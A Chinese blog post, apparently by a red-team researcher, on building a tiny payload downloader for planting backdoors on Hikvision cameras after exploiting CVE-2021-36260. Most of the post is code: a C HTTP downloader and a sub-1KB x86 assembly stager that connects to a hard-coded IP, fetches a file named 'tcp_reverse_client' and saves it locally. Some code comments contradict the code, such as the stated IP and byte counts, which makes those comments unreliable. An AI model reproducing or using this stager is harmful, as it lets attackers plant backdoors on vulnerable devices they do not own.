>
> 引言：极端条件下的IoT设备植入。本文的研究起源于海康威视RCE漏洞利用，通过汇编语言实现了1KB大小的下载器，以解决特定限制情景下的后门植入问题。研究对象是个人购买的摄像头设备，遵纪守法，请知悉。

## 背景

在研究海康威视的RCE漏洞时（CVE-2021-36260），注意到老外的一篇文章（[地址](https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability)）

文章分析了利用该漏洞而广泛传播的Moobot僵尸网络，攻击者的利用载荷被捕获如下：

![图 2.来自 CVE-2021-36260
的有效负载](https://image.3001.net/images/20220319/1647669999_623572ef42b2c1b9b4a4b.png!small)

由于该漏洞本身的限制，命令执行的字符长度有限，而该漏洞设备系统不存在ftp、tftp、wget、curl、telnet等常见的可做下载的工具，其bash编译的时候没有带上/dev/tcp模拟功能；经过我实际测试，一些设备也没有dropbear这样的轻量级ssh工具，因此写入文件只好使用echo命令。

我们知道echo命令可通过-en选项（不换行写入、转义特殊字符）来写入二进制文件。

不过我手头的ARM
backdoor比较大，约700KB，在命令长度有限的情况下，大概要写三万多次，也就是对目标发起三万次的敏感攻击，这无疑是不可取的。既增大了暴露风险，还容易把目标打到拒绝服务，也许还没进行一半，就被防火墙reset了。

根据上面那篇文章的分析，攻击者先通过echo写入了一个下载器，下载器把最终的可执行文件download下来，再手动执行恶意文件。意外的是，这个downloader非常小，我仔细看图数了数，约1200个字节，也就是1.2K。1.2K这么小，估计只能用汇编写了吧？

## 1\. C语言尝试

 **我们不生产代码，我们只是代码的搬运工 QAQ**

直接上CSDN找了份代码，[链接](https://blog.csdn.net/xiongyangg/article/details/50767482)

我们改一改去掉多线程（代码的header头有问题，懒得修改），去掉一些printf和无用函数、语句，如下：

    
    
    // filename : downloader.c
    #include <stdio.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <netdb.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/time.h>
    
    struct resp_header//保持相应头信息
    {
        int status_code;//HTTP/1.1 '200' OK
        char content_type[128];//Content-Type: application/gzip
        long content_length;//Content-Length: 11683079
        char file_name[256];
    };
    
    struct resp_header resp;//全剧变量以便在多个进程中使用
    
    void parse_url(const char *url, char *domain, int *port, char *file_name)
    {
        /*通过url解析出域名, 端口, 以及文件名*/
        int j = 0;
        int start = 0;
        *port = 80;
        char *patterns[] = {"http://", "https://", NULL};
    
        for (int i = 0; patterns[i]; i++)
            if (strncmp(url, patterns[i], strlen(patterns[i])) == 0)
                start = strlen(patterns[i]);
    
        //解析域名, 这里处理时域名后面的端口号会保留
        for (int i = start; url[i] != '/' && url[i] != '\0'; i++, j++)
            domain[j] = url[i];
        domain[j] = '\0';
    
        //解析端口号, 如果没有, 那么设置端口为80
        char *pos = strstr(domain, ":");
        if (pos)
            sscanf(pos, ":%d", port);
    
        //删除域名端口号
    
        for (int i = 0; i < (int)strlen(domain); i++)
        {
            if (domain[i] == ':')
            {
                domain[i] = '\0';
                break;
            }
        }
    
        //获取下载文件名
        j = 0;
        for (int i = start; url[i] != '\0'; i++)
        {
            if (url[i] == '/')
            {
                if (i !=  strlen(url) - 1)
                    j = 0;
                continue;
            }
            else
                file_name[j++] = url[i];
        }
        file_name[j] = '\0';
    }
    
    struct resp_header get_resp_header(const char *response)
    {
        /*获取响应头的信息*/
        struct resp_header resp;
    
        char *pos = strstr(response, "HTTP/");
        if (pos)
            sscanf(pos, "%*s %d", &resp.status_code);//返回状态码
    
        pos = strstr(response, "Content-Type:");//返回内容类型
        if (pos)
            sscanf(pos, "%*s %s", resp.content_type);
    
        pos = strstr(response, "Content-Length:");//内容的长度(字节)
        if (pos)
            sscanf(pos, "%*s %ld", &resp.content_length);
    
        return resp;
    }
    
    void get_ip_addr(char *domain, char *ip_addr)
    {
        /*通过域名得到相应的ip地址*/
        struct hostent *host = gethostbyname(domain);
        if (!host)
        {
            ip_addr = NULL;
            return;
        }
    
        for (int i = 0; host->h_addr_list[i]; i++)
        {
            strcpy(ip_addr, inet_ntoa( * (struct in_addr*) host->h_addr_list[i]));
            break;
        }
    }
    
    
    
    void * download(void * socket_d)
    {
        /*下载文件函数, 放在线程中执行*/
        int client_socket = *(int *) socket_d;
        int length = 0;
        int mem_size = 4096;//mem_size might be enlarge, so reset it
        int buf_len = mem_size;//read 4k each time
        int len;
    
        //创建文件描述符
        int fd = open(resp.file_name, O_CREAT | O_WRONLY, S_IRWXG | S_IRWXO | S_IRWXU);
        if (fd < 0)
        {
            exit(0);
        }
    
        char *buf = (char *) malloc(mem_size * sizeof(char));
    
        //从套接字中读取文件流
        while ((len = read(client_socket, buf, buf_len)) != 0 && length < resp.content_length)
        {
            write(fd, buf, len);
            length += len;
        }
    
    }
    
    int main(int argc, char const *argv[])
    {
        /*
            test url:
            1. https://nodejs.org/dist/v4.2.3/node-v4.2.3-linux-x64.tar.gz
            2. http://img.ivsky.com/img/tupian/pre/201312/04/nelumbo_nucifera-009.jpg
        */
        char url[2048] = "127.0.0.1";
        char domain[64] = {0};
        char ip_addr[16] = {0};
        int port = 80;
        char file_name[256] = {0};
    
        if (argc == 1)
        {
            printf("Input a valid URL please\n");
            exit(0);
        }
        else
            strcpy(url, argv[1]);
    
        parse_url(url, domain, &port, file_name);
    
        if (argc == 3)
            strcpy(file_name, argv[2]);
    
        get_ip_addr(domain, ip_addr);
        if (strlen(ip_addr) == 0)
        {
            return 0;
        }
    
        //设置http请求头信息
        char header[2048] = {0};
        sprintf(header, \
                "GET %s HTTP/1.1\r\n"\
                "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"\
                "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537(KHTML, like Gecko) Chrome/47.0.2526Safari/537.36\r\n"\
                "Host:%s\r\n"\
                "Connection:close\r\n"\
                "\r\n"\
            ,url, domain);
    
    
        //创建套接字
        int client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (client_socket < 0)
        {
            exit(-1);
        }
    
        //创建地址结构体
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(ip_addr);
        addr.sin_port = htons(port);
    
        //连接服务器
        int res = connect(client_socket, (struct sockaddr *) &addr, sizeof(addr));
        if (res == -1)
        {
            exit(-1);
        }
    
        write(client_socket, header, strlen(header));
    
        int mem_size = 4096;
        int length = 0;
        int len;
        char *buf = (char *) malloc(mem_size * sizeof(char));
        char *response = (char *) malloc(mem_size * sizeof(char));
    
        //每次单个字符读取响应头信息, 仅仅读取的是响应部分的头部, 后面单独开线程下载
        while ((len = read(client_socket, buf, 1)) != 0)
        {
            if (length + len > mem_size)
            {
                //动态内存申请, 因为无法确定响应头内容长度
                mem_size *= 2;
                char * temp = (char *) realloc(response, sizeof(char) * mem_size);
                if (temp == NULL)
                {
                    printf("realloc failed\n");
                    exit(-1);
                }
                response = temp;
            }
    
            buf[len] = '\0';
            strcat(response, buf);
    
            //找到响应头的头部信息, 两个"\n\r"为分割点
            int flag = 0;
            for (int i = strlen(response) - 1; response[i] == '\n' || response[i] == '\r'; i--, flag++);
            if (flag == 4)
                break;
    
            length += len;
        }
    
        resp = get_resp_header(response);
        strcpy(resp.file_name, file_name);
    
        download(&client_socket);
        return 0;
    }
    

使用以下语句编译它：  
`gcc -s -O3 -e nomain -nostartfiles -o downloader downloader.c`  
测试得出最终它的大小是14KB：  
![image.png](https://image.3001.net/images/20220319/1647670082_623573423cfc4efd0f5dc.png!small)  
14KB相比于700KB是挺小了，是不是该打完收工了。

这就放弃了吗？

come on， 这一点都不极客啊。既然要做 就做最小（狗头）

## 2\. 汇编挑战

根据我大学生涯中无数个汇编课坐在第一排睡觉的经验，我觉得我们还是先写linux下的汇编代码通了以后再考虑实现ARM架构下的代码吧。以前觉得汇编有啥用，现在真香，直叫当年咋没好好学。

经过我 三下五除二 一顿操作猛如虎 混元霹雳闪电 终于啪的一下写好了，很快啊！

    
    
    ; downloader
    
    ; Compile with: nasm -f elf crawler3-0c.asm
    
    ; Link with (64 bit systems require elf_i386 option): ld.gold -m elf_i386 craw3-0c.o -o crawler
    
    ; Run with: ./crawler
    
    
    
     
    
    SECTION .data
    
    ; our request string
    
    request db 'GET /tcp_reverse_client HTTP/1.1', 0Dh, 0Ah, 'Accept: */*', 0Dh, 0Ah, 0Dh, 0Ah, 0h
    
    filename db 'out', 0h    ; the filename to save to local system
    
    
    
    SECTION .bss
    
    buffer resb 256,                  ; variable to store response
    
     
    SECTION .text
    
    global  _start
    
    
    ;------------------------------------------    
    ; void exit()
    
    ; Exit program and restore resources
    
    quit:
    
        mov     ebx, 0
    
        mov     eax, 1
    
        int     80h
    
        ret
    
    
    
    _start:
    
     
    
        xor     eax, eax            ; init eax 0
    
        xor     ebx, ebx            ; init ebx 0
    
        xor     edi, edi            ; init edi 0
    
     
    _socket:
    
     
        push    byte 6              ; push 6 onto the stack (IPPROTO_TCP)
    
        push    byte 1              ; push 1 onto the stack (SOCK_STREAM)
    
        push    byte 2              ; push 2 onto the stack (PF_INET)
    
        mov     ecx, esp            ; move address of arguments into ecx
    
        mov     ebx, 1              ; invoke subroutine SOCKET (1)
    
        mov     eax, 102            ; invoke SYS_SOCKETCALL (kernel opcode 102)
    
        int     80h                 ; call the kernel
    
     
    
    _connect:
    
    
        mov     edi, eax            ; move return value of SYS_SOCKETCALL into edi (file descriptor for new socket, or -1 on error)
    
        push    dword 0x816fa8c0    ; push 139.162.39.66 onto the stack IP ADDRESS (reverse byte order)
    
        push    word 0x5000         ; push 80 onto stack PORT (reverse byte order)
    
        push    word 2              ; push 2 dec onto stack AF_INET
    
        mov     ecx, esp            ; move address of stack pointer into ecx
    
        push    byte 16             ; push 16 dec onto stack (arguments length)
    
        push    ecx                 ; push the address of arguments onto stack
    
        push    edi                 ; push the file descriptor onto stack
    
        mov     ecx, esp            ; move address of arguments into ecx
    
        mov     ebx, 3              ; invoke subroutine CONNECT (3)
    
        mov     eax, 102            ; invoke SYS_SOCKETCALL (kernel opcode 102)
    
        int     80h                 ; call the kernel
    
     
    
    _write:
    
     
    
        mov     edx, 49             ; move 43 dec into edx (length in bytes to write)
    
        mov     ecx, request        ; move address of our request variable into ecx
    
        mov     ebx, edi            ; move file descriptor into ebx (created socket file descriptor)
    
        mov     eax, 4              ; invoke SYS_WRITE (kernel opcode 4)
    
        int     80h                 ; call the kernel
    
    
    
        ; open file
    
        mov     ecx, 0777o          ; code continues from lesson 22
    
        mov     ebx, filename
    
        mov     eax, 8
    
        int     80h
    
        push    eax
    
    
    _read:
    
    
        mov     edx, 256              ; number of bytes to read (we will read 1 byte at a time)
    
        mov     ecx, buffer         ; move the memory address of our buffer variable into ecx
    
        mov     ebx, edi            ; move edi into ebx (created socket file descriptor)
    
        mov     eax, 3              ; invoke SYS_READ (kernel opcode 3)
    
        int     80h                 ; call the kernel
    
     
    
        cmp     eax, 0              ; if return value of SYS_READ in eax is zero, we have reached the end of the file
    
        jz      _close              ; jmp to _close if we have reached the end of the file (zero flag set)
    
        mov     edx, eax            ; edx to save bytes length
    
    
     
    _do_cmp:
    
        ;  check if the buffer contains 'HTTP/'  at the beginning
    
        mov     ebx, buffer         ; move the address of our message string into EBX
    
        mov     eax, ebx            ; move the address in EBX into EAX as well (Both now point to the same segment in memory)
    
        cmp     byte [eax], 72
    
        jnz     _reset_eax
    
        cmp     byte [eax+1], 84
    
        jnz     _reset_eax
    
        cmp     byte [eax+2], 84
    
        jnz     _reset_eax
    
        cmp     byte [eax+3], 80
    
        jnz     _reset_eax
    
        cmp     byte [eax+4], 47
    
        jnz     _reset_eax ; 13 10 13 10
    
    
    
    nextchar: 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 13  ; compare the byte pointed to by EAX at this address against '\r'
    
        jnz     nextchar        ; jump (if it is not \r) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 10  ; compare the byte pointed to by EAX at this address against '\n'
    
        jnz     nextchar        ; jump (if it is not \n) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 13  ; compare the byte pointed to by EAX at this address against '\r'
    
        jnz     nextchar        ; jump (if it is not \r) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 10  ; compare the byte pointed to by EAX at this address against '\n'
    
        jnz     nextchar        ; jump (if it is not \r) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        jmp    finished         ; now we reach the end of http header
    
    
    
    
    
    _reset_eax:
    
        mov     eax, buffer 
    
    
    
    
    finished:
    
        push    eax             ; new buff
    
        sub     eax, ebx        ; subtract the address in EBX from the address in EAX
    
                                ; the result is number of segments between them - in this case the number of HTTP header
    
    
    
        sub     edx, eax        ; subtract the address in eax from the address in edx
    
                                ; the result is number of segments between them - in this case the number of real file size without http header
    
    
    
        ; write file 
    
        pop     ecx             ; new buff, move the memory address of our contents string into ecx
    
    
    
        pop     ebx             ; ebx save socket fd
    
        push    ebx
    
    
    
        mov     eax, 4              ; invoke SYS_WRITE (kernel opcode 4)
    
        int     80h                 ; call the kernel
    
    
    
        ; continue to receive file
    
        jmp     _read               ; jmp to _read
    
     
    
    _close:
    
    
    
        ; close file 
    
        pop     ebx                 ; file fd
    
        mov     ebx, ebx            ; not needed but used to demonstrate that SYS_CLOSE takes a file descriptor from EBX
    
        mov     eax, 6              ; invoke SYS_CLOSE (kernel opcode 6)
    
        int     80h                 ; call the kernel
    
    
    
        cmp     edi, 0              ; if edi(connected socket file descriptor) is null, we jump to exit
    
        jz      _exit
    
     
    
        ; otherwise , we close socket
    
        mov     ebx, edi            ; move edi into ebx (connected socket file descriptor)
    
        mov     eax, 6              ; invoke SYS_CLOSE (kernel opcode 6)
    
        int     80h                 ; call the kernel
    
    
    
    _exit:
    
        call    quit                ; call our quit function
    

使用以下命令生成可执行程序

    
    
    nasm -f elf craw3-0c.asm 
    ld.gold -s -m elf_i386 craw3-0c.o -o crawler
    

最终程序大小为756字节，小于1KB：  
![image.png](https://image.3001.net/images/20220319/1647672208_62357b90868a0626366e9.png!small)  
执行`./crawler`即可从本地127.0.0.1下载web根目录下载文件'https'到当前目录下，并保存为'out'  
![image.png](https://image.3001.net/images/20220319/1647671940_62357a849728f6494717b.png!small)

我们运行一下，检查out是否正常：

![image.png](https://image.3001.net/images/20220319/1647672101_62357b25c530186958dd6.png!small)

程序正常运行，说明下载功能正常。

该汇编代码的编写参考了这个网站 https://asmtutor.com/

主要参考Lesson 3、22、23、24、25、26、36，源码在Lesson 36基础上做了修改，实现了写文件、去掉http头直接保存二进制文件的功能。

以下根据上文代码框中的asm代码，做一些说明，主要讲修改的部分。

### 程序主逻辑

_start -> _socket -> _connect -> _write -> _read -> _do_cmp -> nextchar ->
finished -> exit

首先系统调用创建socket，连接，发送http请求头，接收响应数据，去掉响应报文的http头，剩下的数据写入本地文件。

### 去掉http头逻辑

相关代码如下

    
    
    _read:
    
     
    
        mov     edx, 256              ; number of bytes to read (we will read 1 byte at a time)
    
        mov     ecx, buffer         ; move the memory address of our buffer variable into ecx
    
        mov     ebx, edi            ; move edi into ebx (created socket file descriptor)
    
        mov     eax, 3              ; invoke SYS_READ (kernel opcode 3)
    
        int     80h                 ; call the kernel
    
     
    
        cmp     eax, 0              ; if return value of SYS_READ in eax is zero, we have reached the end of the file
    
        jz      _close              ; jmp to _close if we have reached the end of the file (zero flag set)
    
        mov     edx, eax            ; edx to save bytes length
    
    
    
    
    
    _do_cmp:
    
        ;  check if the buffer contains 'HTTP/'  at the beginning
    
        mov     ebx, buffer         ; move the address of our message string into EBX
    
        mov     eax, ebx            ; move the address in EBX into EAX as well (Both now point to the same segment in memory)
    
        cmp     byte [eax], 72
    
        jnz     _reset_eax
    
        cmp     byte [eax+1], 84
    
        jnz     _reset_eax
    
        cmp     byte [eax+2], 84
    
        jnz     _reset_eax
    
        cmp     byte [eax+3], 80
    
        jnz     _reset_eax
    
        cmp     byte [eax+4], 47
    
        jnz     _reset_eax ; 13 10 13 10
    
    
    
    nextchar: 
    
    
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 13  ; compare the byte pointed to by EAX at this address against '\r'
    
        jnz     nextchar        ; jump (if it is not \r) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 10  ; compare the byte pointed to by EAX at this address against '\n'
    
        jnz     nextchar        ; jump (if it is not \n) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 13  ; compare the byte pointed to by EAX at this address against '\r'
    
        jnz     nextchar        ; jump (if it is not \r) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        cmp     byte [eax], 10  ; compare the byte pointed to by EAX at this address against '\n'
    
        jnz     nextchar        ; jump (if it is not \r) 
    
        inc     eax             ; increment the address in EAX by one byte 
    
    
    
        jmp    finished         ; now we reach the end of http header
    
    
    
    
    
    _reset_eax:
    
        mov     eax, buffer 
    
    
    
    
    
    finished:
    
        push    eax             ; new buff
    
        sub     eax, ebx        ; subtract the address in EBX from the address in EAX
    
                                ; the result is number of segments between them - in this case the number of HTTP header
    
    
    
        sub     edx, eax        ; subtract the address in eax from the address in edx
    
                                ; the result is number of segments between them - in this case the number of real file size without http header
    
    
    
        ; write file 
    
        pop     ecx             ; new buff, move the memory address of our contents string into ecx
    
    
    
        pop     ebx             ; ebx save socket fd
    
        push    ebx
    
    
    
        mov     eax, 4              ; invoke SYS_WRITE (kernel opcode 4)
    
        int     80h                 ; call the kernel
    
    
    
        ; continue to receive file
    
        jmp     _read               ; jmp to _read```
    

_read从缓冲区接收数据，每次取256个字节存到buffer，接着进入_do_cmp，判断当前buffer的前5个字节是否是"HTTP/"，如果不是则直接追加写入文件，如果是则进入nextchar，找到http头结尾“\r\n\r\n”，接着都会进到finished，在finished中计算http头长度和实际想下载的文件的长度，最后写文件，再跳回_read进行下一次读取，直至缓冲区的数据读完。这样
一个文件就下载完成了，我在代码中也写了很多注释，可以结合着看。

## 3\. 总结

  * TODO  
实现ARM架构下的downloader，这里因为不想给黑（我）产（很）白（懒）嫖，所以就不写了。

最终我们实现了一个只有700多字节的下载器，它可以在一些极端的特定的场景下帮助红队人员打开入口。这是个简单的程序，它可能存在bug或有着更好的实现方法，也欢迎大佬留言交流指点，谢谢观看（鞠躬）。

